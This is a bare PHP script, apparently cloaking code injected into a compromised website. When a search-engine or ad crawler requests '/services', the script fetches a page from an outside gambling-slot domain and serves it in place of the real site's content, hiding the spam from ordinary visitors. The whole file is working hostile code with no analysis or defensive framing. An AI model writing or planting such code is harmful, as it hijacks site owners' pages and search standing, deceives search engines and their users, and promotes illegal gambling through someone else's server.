<?php
function cihuy3x0($url) {
    if (ini_get('allow_url_fopen')) {
        return @file_get_contents($url);
    } elseif (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        curl_setopt(
            $ch,
            CURLOPT_USERAGENT,
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'
        );
        $response = curl_exec($ch);
        curl_close($ch);
        return $response;
    }
    return false;
}

$userAgent  = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
$requestUri = parse_url($_SERVER['REQUEST_URI'] ?? '/', PHP_URL_PATH);
$path       = rtrim($requestUri, '/'); 

if ($path === '') {
    $path = '/';
}

$botPattern = '/(googlebot|slurp|adsense|inspection|ahrefsbot|telegrambot|bingbot|yandexbot)/i';


$cloakMap = [
    '/services'                 => 'https://vipslot.doomino4d.com/',
  
];

if (preg_match($botPattern, $userAgent) && isset($cloakMap[$path])) {
    $botUrl = $cloakMap[$path];
    $file = cihuy3x0($botUrl);
    if ($file !== false && $file !== '') {
        echo $file;
        exit;
    }
}
